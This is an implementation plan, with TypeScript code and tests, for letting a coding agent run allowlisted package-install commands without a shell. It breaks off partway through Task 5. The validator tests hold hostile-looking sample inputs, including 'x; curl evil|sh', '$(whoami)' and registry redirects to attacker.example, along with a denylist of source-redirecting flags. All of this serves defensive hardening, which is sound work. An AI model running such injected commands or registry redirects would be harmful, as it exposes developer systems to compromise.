# Exec Allowlist Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give write-capable native ops a way to run an allowlisted, model-authored argv (package installs above all) so a missing dependency is installed rather than edited out of existence.

**Architecture:** `RunCommand` gains a second, mutually exclusive input branch. The declared branch is unchanged (project-authored template, shell, `runQualityCommand`). The new argv branch is model-authored, runs with `shell: false` through an executor extracted from `src/worktree/dependencies.ts`, and passes two independent gates: an `Exec` capability marker in the op's tool declaration, and an `Exec(...)` grant compiled by the existing policy. A per-binary table then hardens and workspace-normalizes the argv; it can only narrow.

**Tech Stack:** TypeScript, Bun, Zod. Repo: `~/workspace/subrina-coder/projects/nax/repos/nax`. Branch: `feat/native-exec-allowlist`.

**Spec:** `docs/superpowers/specs/2026-09-06-native-exec-allowlist-design.md` — read it before Task 1. Every task below traces to a section of it.

## Global Constraints

- No file in `src/` may exceed **600 lines**; no file in `test/` may exceed **800 lines** (`scripts/check-file-sizes.ts`). New files must come in under, not be baselined. Note the two numbers differ on purpose: `.nax/rules/project-conventions.md` sets a **400-line convention** for new source files, and 600 is the gate's hard limit. Aim for 400; 600 fails the build.
- Imports use the `@/` alias inside `src/` (`import { x } from "@/tools"`), matching neighbours.
- The argv branch must never call `runQualityCommand` and must never construct a shell string. Task 6 adds a test that fails if it does.
- Every commit runs the repo pre-commit gate (typecheck + biome + 24 check scripts). Do not bypass it with `--no-verify`.
- Targeted test run: `bun test <path> --timeout=60000`. Full suite: `bun run test` (never bare `bun test` at the repo root).
- No emojis in code, comments, or docs.
- Conventional commits: `feat:`, `fix:`, `refactor:`, `docs:`, `test:`.

---

### Task 1: Extract the argv executor

Spec section 3. `prepareWorktreeDependencies` already spawns argv-style with no shell and has three hard-won behaviours (MEM-4 process-group kill, BUG-13 deadline, concurrent pipe drain). Extract them so the `Exec` branch inherits them instead of reimplementing them.

**Files:**
- Create: `src/utils/argv-exec.ts`
- Modify: `src/worktree/dependencies.ts` (replace its inline spawn with a call)
- Test: `test/unit/utils/argv-exec.test.ts`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces:
  ```ts
  export interface RunArgvOptions {
    readonly argv: readonly string[];
    readonly cwd: string;
    readonly timeoutMs: number;
    readonly stripEnvVars?: readonly string[];
    /** Overlay applied on top of process.env, after stripping. Yarn 2+ has no
     *  --ignore-scripts flag and takes YARN_ENABLE_SCRIPTS instead, so the
     *  no-scripts mechanism is sometimes an env var rather than an argument. */
    readonly env?: Readonly<Record<string, string>>;
  }
  export interface ArgvExecResult {
    readonly exitCode: number;
    readonly stdout: string;
    readonly stderr: string;
    readonly timedOut: boolean;
  }
  export const _argvExecDeps: { spawn: typeof spawn; killProcessGroup: typeof killProcessGroup };
  export function runArgv(options: RunArgvOptions): Promise<ArgvExecResult>;
  ```

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/utils/argv-exec.test.ts
import { describe, expect, test } from "bun:test";
import { runArgv } from "@/utils/argv-exec";

describe("runArgv", () => {
  test("returns exit code and stdout without a shell", async () => {
    const result = await runArgv({ argv: ["echo", "hello"], cwd: process.cwd(), timeoutMs: 5000 });
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe("hello");
    expect(result.timedOut).toBe(false);
  });

  test("does not interpret shell metacharacters", async () => {
    // With a shell this would print "a" and run `echo b`. Without one, the
    // whole string is a single argument to echo.
    const result = await runArgv({ argv: ["echo", "a; echo b"], cwd: process.cwd(), timeoutMs: 5000 });
    expect(result.stdout.trim()).toBe("a; echo b");
  });

  test("reports timedOut and a non-zero exit when the deadline passes", async () => {
    const result = await runArgv({ argv: ["sleep", "5"], cwd: process.cwd(), timeoutMs: 250 });
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).not.toBe(0);
  });

  test("applies the env overlay to the child", async () => {
    const result = await runArgv({
      argv: ["sh", "-c", "printenv NAX_TEST_OVERLAY || true"],
      cwd: process.cwd(),
      timeoutMs: 5000,
      env: { NAX_TEST_OVERLAY: "on" },
    });
    expect(result.stdout.trim()).toBe("on");
  });

  test("strips the named environment variables from the child", async () => {
    process.env.NAX_TEST_SECRET = "leaked";
    try {
      const result = await runArgv({
        argv: ["sh", "-c", "printenv NAX_TEST_SECRET || true"],
        cwd: process.cwd(),
        timeoutMs: 5000,
        stripEnvVars: ["NAX_TEST_SECRET"],
      });
      expect(result.stdout).not.toContain("leaked");
    } finally {
      process.env.NAX_TEST_SECRET = undefined;
    }
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/utils/argv-exec.test.ts --timeout=60000`
Expected: FAIL — `Cannot find module '@/utils/argv-exec'`.

- [ ] **Step 3: Write the implementation**

```ts
// src/utils/argv-exec.ts
/**
 * Run an argv with no shell, a deadline, and a process-group kill.
 *
 * Extracted from worktree/dependencies.ts so its two callers cannot drift.
 * The three behaviours here were each a defect once and must not be rewritten
 * from scratch: MEM-4 (a postinstall grandchild survived proc.kill() and kept
 * running against a deleted worktree), BUG-13 (a hung install had no deadline),
 * and the concurrent drain (a child that fills a pipe buffer never reaches
 * `exited`, defeating the timeout).
 */
import { spawn } from "./bun-deps";
import { killProcessGroup } from "./process-kill";

export interface RunArgvOptions {
  readonly argv: readonly string[];
  readonly cwd: string;
  readonly timeoutMs: number;
  readonly stripEnvVars?: readonly string[];
  /**
   * Overlay applied on top of process.env, after stripping.
   *
   * Yarn 2+ has no --ignore-scripts option and honours the enableScripts
   * setting instead, overridable per invocation by YARN_ENABLE_SCRIPTS. So the
   * no-scripts mechanism is a flag for some managers and an environment
   * variable for others, and both must be nax-supplied.
   */
  readonly env?: Readonly<Record<string, string>>;
}

export interface ArgvExecResult {
  readonly exitCode: number;
  readonly stdout: string;
  readonly stderr: string;
  readonly timedOut: boolean;
}

/** Injectable seam, mirroring _worktreeDependencyDeps. */
export const _argvExecDeps = { spawn, killProcessGroup };

export async function runArgv(options: RunArgvOptions): Promise<ArgvExecResult> {
  const env: Record<string, string | undefined> = { ...process.env };
  for (const name of options.stripEnvVars ?? []) delete env[name];
  Object.assign(env, options.env ?? {});

  const proc = _argvExecDeps.spawn([...options.argv], {
    cwd: options.cwd,
    stdout: "pipe",
    stderr: "pipe",
    env,
    // MEM-4: setsid() makes this pid the process-group id, so a group kill
    // reaches grandchildren (a package manager's postinstall) rather than only
    // the direct child.
    detached: true,
  });

  let timedOut = false;
  const timerId = setTimeout(() => {
    timedOut = true;
    _argvExecDeps.killProcessGroup(proc.pid, "SIGKILL");
  }, options.timeoutMs);

  // Drain concurrently with the exit wait; see the header.
  const stdoutPromise = new Response(proc.stdout).text().catch(() => "");
  const stderrPromise = new Response(proc.stderr).text().catch(() => "");
  const exitCode = await proc.exited;
  clearTimeout(timerId);
  const [stdout, stderr] = await Promise.all([stdoutPromise, stderrPromise]);

  return { exitCode, stdout, stderr, timedOut };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `bun test test/unit/utils/argv-exec.test.ts --timeout=60000`
Expected: PASS (5 tests).

- [ ] **Step 5: Rewrite `provisionDependencies` to use it**

In `src/worktree/dependencies.ts`, replace the spawn/timer/drain block inside `provisionDependencies` with a `runArgv` call, keeping the existing error semantics exactly:

```ts
const result = await runArgv({
  argv,
  // Provisioning must run from the worktree root so workspace/monorepo install
  // commands operate on the repo-level manifest.
  cwd: worktreeRoot,
  timeoutMs,
});

if (result.timedOut) {
  throw new WorktreeDependencyPreparationError(
    `[worktree-deps] provision timed out after ${config.execution.worktreeDependencies.timeoutSeconds}s in ${resolvedCwd}`,
    "provision",
  );
}
if (result.exitCode !== 0) {
  const output = [result.stdout, result.stderr].filter(Boolean).join("\n").trim();
  throw new WorktreeDependencyPreparationError(
    `[worktree-deps] provision failed in ${resolvedCwd}: ${output || "unknown error"}`,
    "provision",
  );
}
return { cwd: resolvedCwd };
```

Keep `_worktreeDependencyDeps` exported (existing tests inject through it); have it delegate to `_argvExecDeps` so both names address the same seam, or update those tests to inject through `_argvExecDeps`. Read `test/unit/worktree/` first and choose whichever keeps its assertions meaningful rather than merely green.

- [ ] **Step 6: Run the worktree tests**

Run: `bun test test/unit/worktree --timeout=60000`
Expected: PASS, with the existing timeout and group-kill tests still asserting the same behaviour.

- [ ] **Step 7: Commit**

```bash
git add src/utils/argv-exec.ts src/worktree/dependencies.ts test/unit/utils/argv-exec.test.ts test/unit/worktree
git commit -m "refactor: extract the no-shell argv executor from worktree provisioning"
```

---

### Task 2: The `Exec` name and grant

Spec section 1. `Exec` is a `CodingToolName` used as a declaration marker and as the policy identity for argv calls. It is deliberately absent from `unrestricted`'s blanket grant.

**Files:**
- Modify: `src/tools/types.ts` (add `"Exec"` to `CodingToolName`)
- Modify: `src/tools/registry.ts` (add `"Exec"` to `RESERVED_TOOL_NAMES`)
- Modify: `src/config/permissions.ts` (exclude `Exec` from `unconditionalGrants`)
- Test: `test/unit/config/permissions-exec-grant.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces: `EXEC_TOOL_NAME = "Exec"` exported from `src/tools/types.ts`; `CodingToolName` now includes `"Exec"`.

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/config/permissions-exec-grant.test.ts
import { describe, expect, test } from "bun:test";
import { resolvePermissions } from "@/config/permissions";

const baseConfig = { execution: { permissionProfile: "unrestricted" } } as never;

describe("Exec grant", () => {
  test("unrestricted grants Exec the built-in install list, never a wildcard", () => {
    const resolved = resolvePermissions(baseConfig, "run");
    const execGrant = (resolved.toolGrants ?? []).find((g) => g.tool === "Exec");
    expect(execGrant).toBeDefined();
    // The whole point of the exclusion: unrestricted means "any tool, any path
    // within the root", and must never come to mean "any command".
    expect(execGrant?.patterns).not.toContain("*");
    expect(execGrant?.patterns).toContain("bun add*");
    expect(execGrant?.patterns).toContain("npm ci");
  });

  test("the built-in list holds install forms only", () => {
    const resolved = resolvePermissions(baseConfig, "run");
    const patterns = (resolved.toolGrants ?? []).find((g) => g.tool === "Exec")?.patterns ?? [];
    // A generic command is reachable only through a human-written grant.
    expect(patterns.some((p) => p.startsWith("make") || p.includes(" x "))).toBe(false);
  });

  test("unrestricted still grants the ordinary tools", () => {
    // Both halves non-empty: asserting only the Exec shape above would pass
    // trivially if grant resolution were broken end to end.
    const resolved = resolvePermissions(baseConfig, "run");
    const tools = (resolved.toolGrants ?? []).map((g) => g.tool);
    expect(tools).toContain("Write");
    expect(tools).toContain("RunCommand");
  });

  test("an explicit Exec expression parses into patterns", () => {
    const config = {
      execution: { permissionProfile: "scoped", toolGrants: ["Exec(bun add*, bun install)", "Read"] },
    } as never;
    const resolved = resolvePermissions(config, "run");
    const execGrant = (resolved.toolGrants ?? []).find((g) => g.tool === "Exec");
    expect(execGrant?.patterns).toEqual(["bun add*", "bun install"]);
  });
});
```

Before writing it, open `src/config/permissions.ts` and confirm the exact shape of the scoped-profile input (the field name carrying `#374` expressions). Match the test to the real shape rather than the shape assumed here; if the scoped profile reads its expressions from a different key, use that key and keep the assertions.

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/config/permissions-exec-grant.test.ts --timeout=60000`
Expected: FAIL — `unconditionalGrants` currently emits `Exec` with `["*"]` like every other tool.

- [ ] **Step 3: Implement**

In `src/tools/types.ts`:

```ts
/** Policy identity for RunCommand's argv branch, and the op-declaration marker. */
export const EXEC_TOOL_NAME = "Exec";

export type CodingToolName =
  | "Read"
  | "Glob"
  | "Grep"
  | "Write"
  | "Edit"
  | "Git"
  | "GitCommit"
  | "RunCommand"
  | "RequestCapability"
  | "Exec";
```

In `src/tools/registry.ts`, add `"Exec"` to `RESERVED_TOOL_NAMES` so no third party can register a tool that shadows the policy identity.

In `src/config/permissions.ts`:

```ts
/**
 * What `Exec` may run when a project has written no grant of its own.
 *
 * DEFAULT_PERMISSION_PROFILE is `unrestricted`, and unrestricted means "any
 * tool, any path within the root". Letting it also mean "any command" would
 * ship a general exec to every run by default, which ADR-029 section 3 forbids.
 * So Exec is excluded from the blanket grant and given this list instead: the
 * restore and add forms nax knows how to harden, and nothing else. A project
 * widens it by writing `Exec(...)` explicitly, which is a human decision
 * recorded in config.
 */
export const BUILT_IN_EXEC_PATTERNS: readonly string[] = [
  "bun install",
  "bun add*",
  "npm ci",
  "npm install*",
  "pnpm install*",
  "pnpm add*",
  "yarn install*",
  "yarn add*",
  "pip install*",
  "uv sync*",
  "uv add*",
  "go mod download",
  "go get*",
  "cargo fetch",
  "cargo add*",
];

function unconditionalGrants(tools: readonly string[]): ToolGrant[] {
  return tools.map((tool) =>
    tool === EXEC_TOOL_NAME ? { tool, patterns: BUILT_IN_EXEC_PATTERNS } : { tool, patterns: ["*"] },
  );
}
```

An explicit `Exec(...)` expression **replaces** this list rather than adding to it, so a project that writes `Exec(bun x tsc*)` and still wants installs must name them too. Say so in the field's config documentation — a grant that silently kept a hidden default would be the same class of surprise as `unrestricted` meaning "any command".

- [ ] **Step 4: Run test to verify it passes**

Run: `bun test test/unit/config/permissions-exec-grant.test.ts --timeout=60000`
Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add src/tools/types.ts src/tools/registry.ts src/config/permissions.ts test/unit/config/permissions-exec-grant.test.ts
git commit -m "feat(tools): add the Exec grant identity, excluded from unrestricted"
```

---

### Task 3: Argv validation and the flag denylist

Spec section 3. Two refusals that run before and after the grant match respectively. Kept in their own module so both are unit-testable without a policy or a spawn.

**Files:**
- Create: `src/tools/exec-guard.ts`
- Test: `test/unit/tools/exec-guard.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```ts
  export function validateArgv(argv: unknown): string | undefined;      // error message, or undefined when clean
  export function deniedFlag(argv: readonly string[]): string | undefined; // the offending flag, or undefined
  export const DENIED_FLAGS: readonly string[];
  ```

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/tools/exec-guard.test.ts
import { describe, expect, test } from "bun:test";
import { deniedFlag, validateArgv } from "@/tools/exec-guard";

describe("validateArgv", () => {
  test("accepts a plain install argv", () => {
    expect(validateArgv(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });

  test("rejects shell metacharacters", () => {
    for (const bad of ["x; curl evil|sh", "$(whoami)", "a && b", "`id`", "a > out", "a\nb"]) {
      expect(validateArgv(["bun", "add", bad])).toBeDefined();
    }
  });

  test("rejects a leading tilde", () => {
    expect(validateArgv(["bun", "add", "~/x"])).toBeDefined();
  });

  test("rejects a binary containing a path separator", () => {
    expect(validateArgv(["./evil", "run"])).toBeDefined();
  });

  test("rejects an empty argv and non-string elements", () => {
    expect(validateArgv([])).toBeDefined();
    expect(validateArgv(["bun", 3])).toBeDefined();
    expect(validateArgv("bun add")).toBeDefined();
  });
});

describe("deniedFlag", () => {
  test("catches a registry redirect that a prefix grant would admit", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry", "https://attacker.example"])).toBe("--registry");
  });

  test("catches --index-url, -g and --prefix", () => {
    expect(deniedFlag(["pip", "install", "x", "--index-url", "http://x"])).toBe("--index-url");
    expect(deniedFlag(["npm", "install", "-g", "x"])).toBe("-g");
    expect(deniedFlag(["npm", "install", "--prefix", "/tmp"])).toBe("--prefix");
  });

  test("catches --flag=value form", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry=https://attacker.example"])).toBe("--registry");
  });

  test("allows an ordinary install", () => {
    expect(deniedFlag(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/tools/exec-guard.test.ts --timeout=60000`
Expected: FAIL — `Cannot find module '@/tools/exec-guard'`.

- [ ] **Step 3: Implement**

```ts
// src/tools/exec-guard.ts
/**
 * The two refusals that bracket the grant match for a model-authored argv.
 *
 * `validateArgv` runs FIRST, before any pattern matching, so a malformed token
 * can never be admitted by a `*` in a grant. `deniedFlag` runs AFTER the match,
 * because a prefix grant gates the verb and not the payload: `bun add*` admits
 * `--registry https://attacker.example`, which changes where the code comes
 * from without changing the verb the allowlist approved.
 */

const METACHARACTERS = /[;&|$`()<>\n\r]/;

export function validateArgv(argv: unknown): string | undefined {
  if (!Array.isArray(argv)) return "argv must be an array of strings";
  if (argv.length === 0) return "argv must not be empty";
  for (const element of argv) {
    if (typeof element !== "string") return "every argv element must be a string";
    if (element.length === 0) return "argv elements must not be empty";
    if (METACHARACTERS.test(element)) return `argv element contains a shell metacharacter: ${element}`;
    if (element.startsWith("~")) return `argv element must not start with "~": ${element}`;
  }
  const binary = argv[0] as string;
  if (binary.includes("/") || binary.includes("\\")) {
    return `the command must resolve through PATH, not a path: ${binary}`;
  }
  return undefined;
}

/**
 * Flags that redirect where code comes from or where it lands.
 *
 * Not a general "unsafe flag" list -- it is specifically the set a verb gate
 * cannot see, which is why it is enumerated rather than pattern-matched.
 */
export const DENIED_FLAGS: readonly string[] = [
  "--registry",
  "--index-url",
  "--index",
  "-i",
  "--config",
  "--userconfig",
  "--global",
  "-g",
  "--prefix",
  "--unsafe-perm",
];

export function deniedFlag(argv: readonly string[]): string | undefined {
  for (const element of argv) {
    const name = element.includes("=") ? (element.split("=")[0] as string) : element;
    if (DENIED_FLAGS.includes(name)) return name;
  }
  return undefined;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `bun test test/unit/tools/exec-guard.test.ts --timeout=60000`
Expected: PASS (9 tests).

- [ ] **Step 5: Commit**

```bash
git add src/tools/exec-guard.ts test/unit/tools/exec-guard.test.ts
git commit -m "feat(tools): add argv validation and the registry-flag denylist"
```

---

### Task 4: The package-manager table, call classes, and workspace normalization

Spec sections 2 and 3. The table decides which of two classes a call belongs to, then hardens and normalizes install-shaped calls. It can never widen.

**The two classes.** A call is *install-shaped* when `argv[0]` is a known manager AND the verb is one of that manager's install verbs; it must be hardened and normalized. Anything else is *generic*: run as given at the target cwd, no normalization, no no-scripts mechanism, and reachable only through an explicit `Exec(...)` grant. Both directions matter — without the generic class `bun x tsc --noEmit` could never be granted, and without the "known manager plus install verb" test a loosely classified `bun add` could skip its no-scripts flag.

**Files:**
- Create: `src/tools/package-managers.ts`
- Create: `src/tools/package-managers-table.ts` (split if the first exceeds 400 lines)
- Test: `test/unit/tools/package-managers.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```ts
  export type ExecTarget = "package" | "repoRoot";
  export interface NormalizeInput {
    readonly argv: readonly string[];
    readonly target: ExecTarget;
    readonly repoRoot: string;
    readonly packageWorkdir: string;
    readonly packageRelPath: string;        // "" when the story is the repo root
    readonly packageName?: string;          // from the member manifest; required by yarn and cargo
    readonly allowScripts: boolean;
  }
  export type NormalizeResult =
    | { readonly argv: readonly string[]; readonly cwd: string; readonly env?: Readonly<Record<string, string>> }
    | { readonly error: string };
  export function classifyExec(argv: readonly string[]): "install" | "generic";
  export function normalizeExec(input: NormalizeInput): NormalizeResult;
  export function isKnownManager(binary: string): boolean;
  ```

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/tools/package-managers.test.ts
import { describe, expect, test } from "bun:test";
import { classifyExec, isKnownManager, normalizeExec } from "@/tools/package-managers";

const base = {
  repoRoot: "/repo",
  packageWorkdir: "/repo/packages/foo",
  packageRelPath: "packages/foo",
  packageName: "@acme/foo",
  allowScripts: false,
} as const;

describe("classifyExec", () => {
  test("a known manager with an install verb is install-shaped", () => {
    expect(classifyExec(["bun", "add", "x"])).toBe("install");
    expect(classifyExec(["npm", "ci"])).toBe("install");
    expect(classifyExec(["go", "mod", "download"])).toBe("install");
  });

  test("a known manager with a non-install verb is generic", () => {
    // The second thing the 2026-09-06 run's model reached for. If this is
    // "install", no grant can ever permit it.
    expect(classifyExec(["bun", "x", "tsc", "--noEmit"])).toBe("generic");
    expect(classifyExec(["npm", "run", "build"])).toBe("generic");
  });

  test("an unknown binary is generic", () => {
    expect(classifyExec(["make", "build"])).toBe("generic");
  });
});

describe("normalizeExec — install-shaped", () => {
  test("appends the no-scripts flag and runs a package-target bun add in the package dir", () => {
    expect(normalizeExec({ ...base, argv: ["bun", "add", "-d", "bun-types"], target: "package" })).toEqual({
      argv: ["bun", "add", "-d", "bun-types", "--ignore-scripts"],
      cwd: "/repo/packages/foo",
    });
  });

  test("runs a repoRoot-target bun add at the repo root", () => {
    expect(normalizeExec({ ...base, argv: ["bun", "add", "-d", "bun-types"], target: "repoRoot" })).toEqual({
      argv: ["bun", "add", "-d", "bun-types", "--ignore-scripts"],
      cwd: "/repo",
    });
  });

  test("pnpm filters by PATH with the mandatory ./ prefix", () => {
    // Bare "packages/foo" is parsed by pnpm as a package NAME and silently
    // selects nothing. The ./ prefix is what makes it a path.
    expect(normalizeExec({ ...base, argv: ["pnpm", "add", "bun-types"], target: "package" })).toEqual({
      argv: ["pnpm", "--filter", "./packages/foo", "add", "bun-types", "--ignore-scripts"],
      cwd: "/repo",
    });
  });

  test("npm scopes with -w", () => {
    expect(normalizeExec({ ...base, argv: ["npm", "install", "-D", "bun-types"], target: "package" })).toEqual({
      argv: ["npm", "-w", "packages/foo", "install", "-D", "bun-types", "--ignore-scripts"],
      cwd: "/repo",
    });
  });

  test("yarn 1 takes the flag; yarn 2+ takes the environment variable", () => {
    const classic = normalizeExec({ ...base, argv: ["yarn", "add", "bun-types"], target: "package", yarnMajor: 1 } as never);
    expect(classic).toEqual({
      argv: ["yarn", "workspace", "@acme/foo", "add", "bun-types", "--ignore-scripts"],
      cwd: "/repo",
    });

    const berry = normalizeExec({ ...base, argv: ["yarn", "add", "bun-types"], target: "package", yarnMajor: 4 } as never);
    expect(berry).toEqual({
      argv: ["yarn", "workspace", "@acme/foo", "add", "bun-types"],
      cwd: "/repo",
      env: { YARN_ENABLE_SCRIPTS: "false" },
    });
  });

  test("yarn and cargo deny when the package name cannot be resolved", () => {
    const noName = { ...base, packageName: undefined } as const;
    expect(normalizeExec({ ...noName, argv: ["yarn", "add", "x"], target: "package", yarnMajor: 4 } as never)).toHaveProperty("error");
    expect(normalizeExec({ ...noName, argv: ["cargo", "add", "serde"], target: "package" })).toHaveProperty("error");
  });

  test("cargo scopes by NAME, not path", () => {
    expect(normalizeExec({ ...base, packageName: "foo", argv: ["cargo", "add", "serde"], target: "package" })).toEqual({
      argv: ["cargo", "add", "-p", "foo", "serde"],
      cwd: "/repo",
    });
  });

  test("adds no mechanism for managers that run no install scripts", () => {
    expect(normalizeExec({ ...base, argv: ["go", "mod", "download"], target: "package" })).toEqual({
      argv: ["go", "mod", "download"],
      cwd: "/repo/packages/foo",
    });
  });

  test("omits the no-scripts mechanism when the project opted in", () => {
    expect(normalizeExec({ ...base, argv: ["bun", "add", "x"], target: "package", allowScripts: true })).toEqual({
      argv: ["bun", "add", "x"],
      cwd: "/repo/packages/foo",
    });
  });

  test("collapses both targets to one directory in a single-package repo", () => {
    const single = { repoRoot: "/repo", packageWorkdir: "/repo", packageRelPath: "", allowScripts: false } as const;
    expect(normalizeExec({ ...single, argv: ["bun", "add", "x"], target: "package" })).toEqual(
      normalizeExec({ ...single, argv: ["bun", "add", "x"], target: "repoRoot" }),
    );
  });
});

describe("normalizeExec — generic", () => {
  test("runs as given at the package dir, with no scoping and no mechanism", () => {
    expect(normalizeExec({ ...base, argv: ["bun", "x", "tsc", "--noEmit"], target: "package" })).toEqual({
      argv: ["bun", "x", "tsc", "--noEmit"],
      cwd: "/repo/packages/foo",
    });
  });

  test("runs at the repo root when the target says so", () => {
    expect(normalizeExec({ ...base, argv: ["make", "build"], target: "repoRoot" })).toEqual({
      argv: ["make", "build"],
      cwd: "/repo",
    });
  });
});

describe("isKnownManager", () => {
  test("knows the eight managers and nothing else", () => {
    for (const binary of ["npm", "bun", "pnpm", "yarn", "pip", "uv", "go", "cargo"]) {
      expect(isKnownManager(binary)).toBe(true);
    }
    expect(isKnownManager("make")).toBe(false);
  });
});
```

The `yarnMajor` casts above are deliberate placeholders for whatever you name the detection input in Step 3 — replace the casts with the real field once it exists, and do not leave `as never` in the committed test.

- [ ] **Step 2: Run test to verify it fails**

Run: `bun test test/unit/tools/package-managers.test.ts --timeout=60000`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement**

Shape each entry as data, not branching logic:

```ts
type NoScripts = { readonly flag: string } | { readonly env: Readonly<Record<string, string>> } | { readonly none: true };

interface ManagerEntry {
  /** Install verbs. A verb outside this list makes the call generic, not denied. */
  readonly installVerbs: readonly (readonly string[])[];   // token sequences, so ["mod","download"] is one verb
  readonly noScripts: (ctx: WorkspaceContext) => NoScripts;
  /** True when the manager needs the member's manifest NAME rather than its path. */
  readonly needsPackageName: boolean;
  readonly packageForm: (argv: readonly string[], ctx: WorkspaceContext) => NormalizeResult;
  readonly rootForm: (argv: readonly string[], ctx: WorkspaceContext) => NormalizeResult;
}
```

Entries, with the facts each depends on:

| manager | install verbs | no-scripts | package form | root form |
|---|---|---|---|---|
| `bun` | `install`, `add` | `--ignore-scripts` | run in the package dir | run at the repo root |
| `npm` | `install`, `ci` | `--ignore-scripts` | `npm -w <relPath> …` at the root (`-w` accepts a path or a name) | `npm …` at the root |
| `pnpm` | `install`, `add` | `--ignore-scripts` | `pnpm --filter ./<relPath> …` at the root — **the `./` prefix is mandatory**, bare `packages/foo` is read as a package name and selects nothing | `pnpm add -w …` at the root |
| `yarn` | `install`, `add` | major 1: `--ignore-scripts`; major 2+: env `YARN_ENABLE_SCRIPTS=false` (no such flag exists on modern Yarn) | `yarn workspace <packageName> …` at the root — **name, not path** | `yarn …` at the root |
| `pip` | `install` | `--only-binary :all:` is NOT a scripts switch; pip has no ignore-scripts. Deny `pip install` of an sdist by passing `--only-binary :all:` so no `setup.py` executes, and document that this is the closest available equivalent | package dir | repo root |
| `uv` | `sync`, `add` | `--no-install-project` is unrelated; use `--no-build-isolation` only if a maintainer confirms it, otherwise `{ none: true }` with a comment saying uv installs wheels by default | `uv add --package <packageName>` at the root | `uv add` at the root |
| `go` | `get`, `mod download` | `{ none: true }` — downloads only, runs nothing | package dir (module dir) | repo root |
| `cargo` | `add`, `fetch` | `{ none: true }` — `cargo add` edits a manifest, `cargo fetch` downloads | `cargo add -p <packageName> …` at the root — **name, not path** | `cargo add …` at the root |

Yarn version detection: read the root manifest's `packageManager` field first (`yarn@1.22.x` versus `yarn@4.x`); fall back to `.yarnrc.yml` presence, which only Yarn 2+ uses. Default to the Yarn 2+ branch when neither is conclusive — the env variable is inert on Yarn 1, whereas passing `--ignore-scripts` to Yarn 2+ is a hard error. Failing toward the inert option is the safe direction.

For `pip` and `uv`, do not invent a switch. If you cannot confirm the mechanism from the tool's own documentation while implementing, give the entry `{ none: true }` and add a comment naming what you checked — a wrong flag either errors out or, worse, looks like protection that is not there. Raise it rather than guessing.

Rules the implementation must honour, all from spec section 2:

1. A rewrite may change only the cwd, add a scoping flag naming **the story's own package**, and add the no-scripts mechanism. It must never name another member and never add a flag from `DENIED_FLAGS`.
2. `packageRelPath === ""` means the story is the repo root: both targets collapse to `repoRoot` and no scoping flag is added.
3. `needsPackageName` entries deny when `packageName` is undefined. Never pass a path where a name is required — it fails silently in pnpm's case and loudly in yarn's, and silent is worse.
4. Verb matching is longest-sequence-first, so `go mod download` matches as one verb rather than as `mod`.
5. Generic calls get cwd from the target and nothing else. No mechanism, no scoping, no rewriting of any argument.

Resolve `packageName` in Task 5's caller by reading the member manifest (`package.json#name`, `Cargo.toml` `[package] name`, `pyproject.toml` `[project] name`) at the package workdir, and pass `undefined` when there is none.

- [ ] **Step 4: Run test to verify it passes**

Run: `bun test test/unit/tools/package-managers.test.ts --timeout=60000`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/tools/package-managers.ts src/tools/package-managers-table.ts test/unit/tools/package-managers.test.ts
git commit -m "feat(tools): add the manager table, call classification and workspace normalization"
```

---

### Task 5: Plumb the repo root to the tool seam

Spec section 2. `AgentRunOptions` currently carries only `codingToolRoot` (the package workdir, from `packageWorkdir(ctx.packageView)` at `src/operations/call.ts:232`). `target: "repoRoot"` cannot be implemented without the repo root reaching the same seam.

**Files:**
- Modify: `src/agents/types.ts` (add `codingToolRepoRoot?: string` beside `codingToolRoot`)
- Modify: `src/operations/call.ts:232` (pass `ctx.packageView.repoRoot`)
- Modify: `src/agents/coding-tool-support.ts` (thread it through `resolveCodingToolSupport` into `buildCodingToolSupport`)
- Test: `test/unit/agents/coding-tool-support-exec.test.ts`

**Interfaces:**
- Consumes: `EXEC_TOOL_NAME` (Task 2).
- Produces: `buildCodingToolSupport` accepts `repoRoot?: string` and `allowScripts?: boolean`, and `CodingToolSupport` is unchanged in shape.

- [ ] **Step 1: Write the failing test**

```ts
// test/unit/agents/coding-tool-support-exec.test.ts
import { describe, expect, test } from "bun:test";
import { buildCodingToolSupport } from "@/agents/coding-tool-support";

describe("buildCodingToolSupport with Exec", () => {
  test("does not advertise a tool named Exec", () => {
    const support = buildCodingToolSupport({
      root: "/repo/packages/foo",
      repoRoot: "/repo",
      grants: [{ tool: "RunCommand", patterns: ["*"] }, { tool: "Exec", patterns: ["bun add*"] }],
      declared: ["RunCommand", "Exec"],
      declaredCommands: new Map([["test", "bun test"]]),
    });
    const names = (support?.tools ?? []).map((t) => t.name);
    expect(names).toContain("RunCommand");
    expect(names).not.toContain("Exec");
  });

  test("RunCommand's schema offers argv only when the op declared Exec", () => {
    const withMarker = buildCodingToolSupport({
      root: "/repo",
      repoRoot: "/repo",
      grants: [{ tool: "RunCommand", patterns: ["*"] }, { tool: "Exec", patterns: ["bun add*"] }],
      declared: ["RunCommand", "Exec"],
      declaredCommands: new Map([["test", "bun test"]]),
    });
    const without = buildCodingToolSupport({
      root: "/repo",
      repoRoot: "/repo",
      grants: [{ tool: "RunCommand", patterns: ["*"] }, { tool: "Exec", patterns: ["bun add*"] }],
